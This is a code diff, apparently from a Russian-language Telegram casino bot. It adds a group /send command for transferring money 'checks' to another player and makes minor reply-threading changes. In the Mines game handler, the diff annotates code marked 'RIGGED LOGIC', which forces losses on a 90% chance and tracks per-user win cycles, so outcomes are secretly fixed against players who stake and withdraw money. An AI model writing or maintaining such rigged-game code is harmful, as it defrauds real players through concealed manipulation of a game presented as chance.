@@ -85,7 +85,7 @@ async def force_subscription_check(message_or_call, state=None):
     text = '<b><tg-emoji emoji-id="5312140414982071786">⚠️</tg-emoji> Для использования бота вы должны быть подписаны на все каналы!</b>'
     
     if isinstance(message_or_call, Message):
-        await message_or_call.answer(text, parse_mode="HTML", reply_markup=kb)
+        await message_or_call.answer(text, parse_mode="HTML", reply_markup=kb, reply_to_message_id=message_or_call.message_id)
     else:
         try:
             await message_or_call.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
@@ -1816,7 +1816,7 @@ async def admin_approve_withdraw_process(message: Message, state: FSMContext) ->
         await message.bot.send_message(user_id, user_text, parse_mode="HTML", disable_web_page_preview=True)
     except Exception as e:
         logger.error(f"Failed to send withdraw notification to user: {e}")
-
+    
     # Отправка в канал Duckcasn
     try:
         user_link = f'<a href="tg://user?id={user_id}">{html.quote(user_name)}</a>'
@@ -2575,7 +2575,6 @@ async def process_custom_football_bet(message: Message, state: FSMContext) -> No
     except ValueError:
         await message.answer('<b><tg-emoji emoji-id="5312140414982071786">❌</tg-emoji> Некорректная сумма.</b>', parse_mode="HTML")
 
-
 # --- ИГРА МИНЫ ---
 @dp.callback_query(F.data.startswith("mines_choose_bet"))
 async def mines_choose_bet_handler(call: CallbackQuery) -> None:
@@ -2666,6 +2665,7 @@ async def start_mines_game_handler(call: CallbackQuery) -> None:
     
     user_rigged_counters[user_id]["games"] += 1
     
+    # Reset cycle every 10 games
     if user_rigged_counters[user_id]["games"] >= 10:
         user_rigged_counters[user_id]["games"] = 0
         user_rigged_counters[user_id]["wins"] = 0
@@ -2676,6 +2676,7 @@ async def start_mines_game_handler(call: CallbackQuery) -> None:
         else:
             force_loss = True
     else:
+        # High bet or normal cycle - 90% loss chance
         if random.random() < 0.90:
             force_loss = True
     # RIGGED LOGIC END
@@ -3426,6 +3427,107 @@ async def group_football_handler(message: Message) -> None:
         )
     except (ValueError, IndexError):
         await message.reply('<b><tg-emoji emoji-id="5312140414982071786">❌</tg-emoji> Формат: футбол [ставка] [гол/мимо/штанга]</b>', parse_mode="HTML")
+
+# --- КОМАНДА /SEND В ГРУППЕ ---
+@dp.message(F.chat.type.in_([ChatType.GROUP, ChatType.SUPERGROUP]), Command("send"))
+async def group_send_handler(message: Message) -> None:
+    # Всегда отвечааем на сообщение пользователя
+    reply_id = message.message_id
+    
+    # Проверка подписки
+    if not await force_subscription_check(message): return
+    
+    args = message.text.split(maxsplit=1)
+    
+    # Если нет аргументов (/send)
+    if len(args) < 2:
+        await message.answer(
+            '<b><tg-emoji emoji-id="5312140414982071786">❌</tg-emoji> Укажите сумму! Например: /send 0.5</b>',
+            parse_mode="HTML",
+            reply_to_message_id=reply_id
+        )
+        return
+        
+    # Парсинг суммы
+    raw_amount = args[1].strip().replace("$", "").replace(",", ".")
+    try:
+        amount = float(raw_amount)
+        if amount <= 0: raise ValueError
+    except ValueError:
+        await message.answer(
+            '<b><tg-emoji emoji-id="5312140414982071786">❌</tg-emoji> Некорректная сумма!</b>',
+            parse_mode="HTML",
+            reply_to_message_id=reply_id
+        )
+        return
+
+    # Проверка реплая
+    if not message.reply_to_message or not message.reply_to_message.from_user:
+        await message.answer(
+            '<b><tg-emoji emoji-id="5312140414982071786">❌</tg-emoji> Ответьте на сообщение одного из игроков!</b>',
+            parse_mode="HTML",
+            reply_to_message_id=reply_id
+        )
+        return
+        
+    sender_id = message.from_user.id
+    target_user = message.reply_to_message.from_user
+    
+    # Нельзя отправить самому себе
+    if sender_id == target_user.id:
+        await message.answer(
+            '<b><tg-emoji emoji-id="5312140414982071786">❌</tg-emoji> Нельзя отправить чек самому себе!</b>',
+            parse_mode="HTML",
+            reply_to_message_id=reply_id
+        )
+        return
+
+    # Проверка баланса
+    balance = get_user_balance(sender_id)
+    if balance < amount:
+        await message.answer(
+            f'<b><tg-emoji emoji-id="5312140414982071786">❌</tg-emoji> Недостаточно средств! Баланс: {balance:.2f}$</b>',
+            parse_mode="HTML",
+            reply_to_message_id=reply_id
+        )
+        return
+        
+    # Создание чека
+    user_balances[sender_id] -= amount
+    await update_balance(sender_id, -amount)
+    
+    chek_id = generate_check_code()
+    target_username = f"@{target_user.username}" if target_user.username else str(target_user.id)
+    
+    created_cheks[chek_id] = {
+        "id": chek_id,
+        "owner_id": sender_id,
+        "amount": amount,
+        "activations": 1,
+        "rem_activations": 1,
+        "password": None,
+        "only_premium": False,
+        "activated_users": set(),
+        "target_user": target_username,
+    }
+    
+    bot_info = await message.bot.get_me()
+    check_link = f"https://t.me/{bot_info.username}?start={chek_id}"
+    
+    target_link = f'<a href="tg://user?id={target_user.id}">{html.quote(target_user.full_name)}</a>'
+    
+    text = (
+        f'<b><tg-emoji emoji-id="5452157517062770940">💸</tg-emoji> Чек на {amount:.2f}$ для {target_link} успешно создан!</b>\n\n'
+        f'<b>Ссылка:</b> <code>{check_link}</code>'
+    )
+    
+    kb = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(text="🎁 Активировать", url=check_link)]
+        ]
+    )
+    
+    await message.answer(text, parse_mode="HTML", reply_markup=kb, reply_to_message_id=reply_id)
 
 
 @dp.message(F.text == "Меню")
